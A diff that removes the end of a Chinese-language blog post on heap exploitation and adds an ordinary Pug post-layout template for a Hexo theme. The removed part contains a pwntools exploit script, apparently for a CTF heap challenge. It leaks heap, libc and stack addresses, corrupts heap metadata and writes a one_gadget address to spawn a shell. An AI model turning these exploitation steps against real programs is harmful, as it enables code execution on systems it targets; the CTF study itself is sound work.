add(p, <span class="number">256</span>, <span class="string">"c"</span>*<span class="number">0xf0</span>)</span><br><span class="line">   add(p, <span class="number">256</span>, <span class="string">"d"</span>*<span class="number">10</span>)</span><br><span class="line">   delete(p, <span class="number">3</span>)</span><br><span class="line">   delete(p, <span class="number">1</span>)</span><br><span class="line">   <span class="comment"># get heap address</span></span><br><span class="line">   p.readuntil(<span class="string">"# CONTENT: "</span>)</span><br><span class="line">   heap = p.readline().rstrip()</span><br><span class="line">   heap += <span class="string">"\x00"</span>*(<span class="number">8</span>-len(heap))</span><br><span class="line">   heap_base = u64(heap) - <span class="number">0x1f0</span></span><br><span class="line">   <span class="keyword">print</span> <span class="string">"heap_base address: "</span> + hex(heap_base)</span><br><span class="line">   <span class="comment"># get libc address</span></span><br><span class="line">   p.readuntil(<span class="string">"INDEX: 3"</span>)</span><br><span class="line">   p.readuntil(<span class="string">"# CONTENT: "</span>)</span><br><span class="line">   libc_address = p.readline().strip()</span><br><span class="line">   libc_address += <span class="string">"\x00"</span>*(<span class="number">8</span>-len(libc_address))</span><br><span class="line">   libc_base = u64(libc_address) - <span class="number">0x3c4b78</span></span><br><span class="line">   <span class="keyword">print</span> <span class="string">"libc_base address: "</span> + hex(libc_base)</span><br><span class="line">    </span><br><span class="line">   <span class="comment"># make top -&gt; tinypad(0x602040)</span></span><br><span class="line">   add(p, <span class="number">232</span>, <span class="string">"g"</span>*<span class="number">224</span> + p64(heap_base+<span class="number">240</span><span class="number">-0x602040</span>))</span><br><span class="line">   delete(p, <span class="number">4</span>)</span><br><span class="line">   payload = p64(<span class="number">0x100</span>) + p64(heap_base+<span class="number">240</span><span class="number">-0x602040</span>) + p64(<span class="number">0x602040</span>)*<span class="number">4</span></span><br><span class="line">   edit(p, <span class="number">2</span>, payload)</span><br><span class="line">   delete(p, <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">   <span class="comment"># modify free_hook -&gt; one_gadget</span></span><br><span class="line">   gadget1 = <span class="number">0xf1117</span></span><br><span class="line">   gadget2 = <span class="number">0xf0274</span></span><br><span class="line">   gadget3 = <span class="number">0xcd1c8</span></span><br><span class="line">   gadget4 = <span class="number">0xcd0f3</span></span><br><span class="line">   gadget5 = <span class="number">0x4526a</span></span><br><span class="line">   gadget6 = <span class="number">0xf66c0</span></span><br><span class="line">   gadget_address = libc_base + gadget1</span><br><span class="line">   add(p, <span class="number">0xe0</span>, <span class="string">"t"</span>*<span class="number">0xd0</span>)</span><br><span class="line">    </span><br><span class="line">   payload = p64(<span class="number">232</span>) + p64(libc_base + libc.symbols[<span class="string">"__environ"</span>])</span><br><span class="line">   payload += p64(<span class="number">232</span>) + p64(<span class="number">0x602148</span>)</span><br><span class="line">   add(p, <span class="number">0x100</span>, payload)</span><br><span class="line">   p.readuntil(<span class="string">"# CONTENT: "</span>)</span><br><span class="line">   stack = p.read(<span class="number">6</span>)</span><br><span class="line">   stack += <span class="string">"\x00"</span>*(<span class="number">8</span>-len(stack))</span><br><span class="line">   stack_env = u64(stack)</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"env_stack address: "</span> + hex(stack_env)</span><br><span class="line">   <span class="comment"># pause()</span></span><br><span class="line">   edit(p, <span class="number">2</span>, p64(stack_env<span class="number">-240</span>))</span><br><span class="line">   edit(p, <span class="number">1</span>, p64(gadget_address))</span><br><span class="line">   p.readuntil(<span class="string">"(CMD)&gt;&gt;&gt;"</span>)</span><br><span class="line">   p.sendline(<span class="string">"Q"</span>)</span><br><span class="line">   p.interactive</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="House-of"><a href="#House-of" class="headerlink" title="House of"></a>House of</h4><ul>
-<li></li>
-</ul>
-<p>参考链接：</p>
-<p><a href="https://paper.seebug.org/521/#house_of_spirit" target="_blank" rel="noopener">Seebug</a></p>
-
-        </div>
-        <div class="post-tool">
-            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
-                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
-            </a>
-        </div>
-        
-        <div class="post-tags">标签：
-            
-            <a href="../../../../tags/pwn/">pwn</a>
-            
-        </div>
-        
-    </article>
-    
-    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
-    
-    
-</div>
-<script src="../../../../js/busuanzi.pure.mini.js"></script>
-
-        </div><!-- end #main-->
-    </div><!-- end #body -->
-    <footer class="footer">
-    <div class="footer-inner">
-        <p>
-            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <!-- 自定义链接 -->
-            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <a href="/app" title="App下载">App下载</a>
-        </p>
-        <p>
-            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
-            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
-            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
-            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
-            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
-        </p>
-        
-
-    </div>
-</footer>
-<script src="../../../../js/InsightSearch.js"></script>
-<script src="../../../../js/SimpleCore.js"></script>
-
-</div>
-<div class="fixed-btn">
-    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
-</div>
-<script>
-    $(function () {
-        SimpleCore.init({
-            buildingTime: '11/22/2018',
-            current: $('.post-tags').length > 0 ? 'post' : 'archive',
-            snsQRCode: '/images/sns-qrcode.png',
-            donateImg: '/images/donate-qr.png',
-        });
-    });
-</script>
-</body>
-</html>
+block content
+  article#post(class="")
+    if (!top_img)
+      #post-title.plain= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
+          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          each item, index in page.categories.data
+            i.fa.fa-inbox(aria-hidden="true")
+            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
+            if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
+        if (theme.disqus.enable && theme.disqus.count)
+          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+            span.post-meta__separator |
+          i.fa.fa-comment-o(aria-hidden="true")
+          a(href=url_for(page.path) + '#disqus_thread')
+            span.disqus-comment-count(data-disqus-identifier=page.path)
+        if (theme.wordcount && theme.wordcount.enable)
+          span.post-meta__separator |
+          span.post-meta-wordcount
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  if (theme.post_meta.tags)
+    .post-meta__tag-list
+      each item, index in page.tags.data
+        a(href=url_for(item.path)).post-meta__tags #[=item.name]
+  if (theme.QR_code)
+    if (theme.QR_code.length > 0)
+      .post-qr-code
+        each item in theme.QR_code
+          .post-qr-code-item
+            img.post-qr-code__img(src=(item.itemlist||item).img)
+            .post-qr-code__desc=(item.itemlist||item).text
+  include includes/share/index.pug
+  include includes/pagination.pug
+  if (theme.adv && theme.adv.enable)
+    .post-adv!= theme.adv.info
+  if page.comments !== false
+    include includes/comments/index.pug
